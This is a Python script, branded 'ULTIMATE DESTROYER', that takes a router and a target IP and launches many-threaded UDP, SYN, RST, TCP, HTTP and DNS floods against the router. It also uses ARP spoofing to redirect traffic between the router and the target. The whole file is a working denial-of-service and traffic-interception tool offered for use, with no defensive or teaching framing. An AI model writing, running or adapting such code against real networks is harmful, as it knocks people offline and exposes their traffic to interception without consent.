import os
import sys
import time
import socket
import random
import threading
from scapy.all import *
from datetime import datetime

now = datetime.now()
hour, minute, day, month, year = now.hour, now.minute, now.day, now.month, now.year

os.system("clear")
os.system("figlet ULTIMATE DESTROYER")
print("\n[+] Author: AHSAN")
print("[+] I kill your WIFi")
print("[+] Warning: Ahsan is REAL Hacker Right!\n")

router_ip = input("[+] Router IP (e.g., 192.168.1.1): ")
target_ip = input("[+] Target IP (e.g., 8.8.8.8): ")
interface = input("[+] Network Interface (e.g., eth0, wlan0): ")
threads = int(input("[+] Threads (1-10000): "))
duration = int(input("[+] Duration (Seconds, 0 for unlimited): "))

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
]

#Packet Counter
packet_count = 0
start_time = time.time()

def udp_flood():
    global packet_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(65500)
    while True:
        try:
            sock.sendto(bytes, (router_ip, 53))
            packet_count += 1
            print(f"[UDP FLOOD] Sent packet {packet_count} to {router_ip}:53")
        except Exception as e:
            print(f"[UDP FLOOD] Failed: {e}")

def tcp_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="S")
            packet = ip/tcp
            send(packet, verbose=False)
            packet_count += 1
            print(f"[TCP FLOOD] Sent SYN packet {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[TCP FLOOD] Failed: {e}")

def http_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="S")
            http_packet = ip/tcp/"GET / HTTP/1.1\r\nHost: " + router_ip + "\r\nUser-Agent: " + random.choice(user_agents) + "\r\nAccept: text/html\r\nConnection: keep-alive\r\n\r\n"
            send(http_packet, verbose=False)
            packet_count += 1
            print(f"[HTTP FLOOD] Sent HTTP request {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[HTTP FLOOD] Failed: {e}")

def arp_spoof():
    global packet_count
    while True:
        try:

            arp_response = ARP(pdst=router_ip, hwdst=getmacbyip(router_ip), psrc=target_ip, op='is_at')
            send(arp_response, verbose=False)

            arp_response = ARP(pdst=target_ip, hwdst=getmacbyip(target_ip), psrc=router_ip, op='is_at')
            send(arp_response, verbose=False)
            packet_count += 1
            print(f"[ARP SPOOFING] Redirecting traffic {packet_count} (Router: {router_ip} -> Target: {target_ip})")
            time.sleep(2)
        except Exception as e:
            print(f"[ARP SPOOFING] Failed: {e}")

def dns_flood():
    global packet_count
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    dns_server = (router_ip, 53)
    while True:
        try:

            dns_query = b'\x00\x01\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00' + random._urandom(32) + b'\x00\x00\x01\x00\x01'
            sock.sendto(dns_query, dns_server)
            packet_count += 1
            print(f"[DNS FLOOD] Sent malicious DNS request {packet_count} to {router_ip}:53")
        except Exception as e:
            print(f"[DNS FLOOD] Failed: {e}")

def syn_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="S")
            packet = ip/tcp
            send(packet, verbose=False)
            packet_count += 1
            print(f"[SYN FLOOD] Sent SYN packet {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[SYN FLOOD] Failed: {e}")

def rst_flood():
    global packet_count
    while True:
        try:
            ip = IP(dst=router_ip)
            tcp = TCP(dport=80, flags="R")
            packet = ip/tcp
            send(packet, verbose=False)
            packet_count += 1
            print(f"[RST FLOOD] Sent RST packet {packet_count} to {router_ip}:80")
        except Exception as e:
            print(f"[RST FLOOD] Failed: {e}")

def main():
    global packet_count, start_time
    print(f"\n[+] ULTIMATE DESTROYER v3.0 Started on {router_ip}!")
    print("[+] ARP Spoofing, DNS Flood, SYN Flood, RST Flood, TCP Flood, UDP Flood, HTTP Flood active!")
    print("[+] Press Ctrl+C to stop the attack.")
    start_time = time.time()

    for _ in range(threads):
        threading.Thread(target=arp_spoof, daemon=True).start()
        threading.Thread(target=dns_flood, daemon=True).start()
        threading.Thread(target=syn_flood, daemon=True).start()
        threading.Thread(target=rst_flood, daemon=True).start()
        threading.Thread(target=tcp_flood, daemon=True).start()
        threading.Thread(target=udp_flood, daemon=True).start()
        threading.Thread(target=http_flood, daemon=True).start()

    if duration > 0:
        time.sleep(duration)
        print("\n[+] Attack stopped after {} seconds!".format(duration))
        print(f"[+] Total packets sent: {packet_count}")
        sys.exit(0)
    else:

        while True:
            time.sleep(1)
            elapsed_time = int(time.time() - start_time)
            print(f"\n[+] Running for {elapsed_time} seconds | Total packets sent: {packet_count}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[+] Attack stopped by user!")
        print(f"[+] Total packets sent: {packet_count}")
        sys.exit(0)
